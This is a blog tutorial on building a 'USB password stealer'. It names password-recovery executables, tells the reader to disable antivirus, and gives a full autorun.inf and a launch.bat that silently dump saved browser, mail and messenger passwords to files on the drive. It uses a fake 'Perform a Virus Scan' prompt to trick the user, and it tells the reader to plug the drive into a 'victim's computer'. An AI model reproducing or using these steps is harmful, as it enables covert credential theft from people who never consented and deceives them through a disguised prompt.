---
title: USB Stealer, Just like those unrealistic movies and TV shows, except this
  one's real.
path: /usb-stealer
tags:
  - Cyber Security
metaImage: assets/usb.jpg
featuredImage: ./assets/usb.jpg
excerpt: Every security system has a flaw and what we’re going to discuss here
  is just that. Most people, with their eyes on the clock and not a second to
  spare just tick “Remember Me” on various websites without a second thought
created: 2020-07-18T10:42:37.871Z
updated: 2020-07-18T10:42:37.933Z
---
There’s a lot of people in the world and even more online accounts. Every security system has a flaw and what we’re going to discuss here is just that. Most people, with their eyes on the clock and not a second to spare just tick “Remember Me” on various websites without a second thought thinking it’s going to save their time. This is particularly common among people who have a private system, maybe a Laptop that nobody else ever touches or a PC which they have locked with a password. Not knowing that there exist many tools to “recover” saved passwords (More like- to exploit exactly these naive people). Browsers store passwords and account details in cookies. What’s quite surprising is just how little security they offer, even worse, none of the browsers seem to care about encrypting passwords. Most of them have an option to “Show Saved Passwords” in the options menu. We’re going to cut even that out, just plug in a USB- Take it out- and Voila! we have all the passwords. That is what you’ll learn in this tutorial. So, with a goal in mind and not a second to spare, let’s start right away.

Things you will need (Intentionally no links are attached):-

**MessenPass** - MessenPass is a password recovery tool that reveals the passwords of several common instant messenger applications.

**Mail PassView** - Mail PassView is a small password-recovery tool that reveals the passwords and other account details for Outlook express, windows mail, POP3, etc

**IE Passview** - IE passview is another small program that helps us view stored passwords in Internet explorer.

**Protected storage pass viewer(PSPV)** - Protected Storage PassView is a small utility that reveals the passwords stored on your computer by Internet Explorer, Outlook Express and MSN Explorer.

**Password Fox** - Password fox is a small program used to view Stored passwords in Mozilla Firefox. (These are the ones I’ve tried and tested. More like these surely exist and you can always Google it out for something possibly better. There are analogous tools for the Chrome browser too. You can find these and tons more at )

So that’s that and now we are ready to create a USB password stealer.

**Note:** These programs tend to attract a lot of attention from antivirus software (Get used to this). Kindly disable your antivirus before performing these steps, at your own risk of course 😉

1. First of all download all 5 tools in your USB. Most of them are just some .exe files (mspass.exe, mailpv.exe, iepv.exe, pspv.exe, and passwordfox.exe). (You need the software completely on your pen drive. Make sure you have all the installation files in your USB\[if any])
2. Create a new Notepad and write the following text into it: \[autorun] open=launch.bat

ACTION= Perform a Virus Scan

Save the Notepad and rename it from New Text Document.txt to autorun.inf

Now copy the autorun.inf file onto your USB Pendrive.

1. Create another Notepad and write the following text onto it.

```restructuredtext
start mspass.exe /stext mspass.txt

start mailpv.exe /stext mailpv.txt

start iepv.exe /stext iepv.txt

start pspv.exe /stext pspv.txt

start passwordfox.exe /stext passwordfox.txt
```

Save the Notepad and rename it from New Text Document.txt to launch.bat

Copy the launch.bat file also to your USB drive.

These were simple commands to start up our password “recovering” programs as soon as we plug in the USB. What we just did here is simply hook up our launch.bat batch file to the autorun.inf file that automatically runs when the computer detects the USB. In the launch.bat, we started up our programs and provided them with file names as parameters so that each program should put in the passwords in their respective .txt files.

- - -

Now your USB password stealer is ready. All you have to do is insert it in your victims computer and a popup will appear, in the popup window select the option (Perform a virus scan) as soon as you will click it, your USB password stealer will do it’s magic and all the passwords saved on the system will be saved in a .txt file. I recommend you try it out on your own system first to see how it should work.

See the last line of our autorun.inf, we are simply specifying the text for the alert dialog. You can type in anything you think is the least suspicious.

This may not work on all operating systems and all different browsers. Your best bet would be to pack in as many diverse programs as you can for giving you the best chance. Also, note that the computer should not have autorun feature disabled for the USB stealer to work.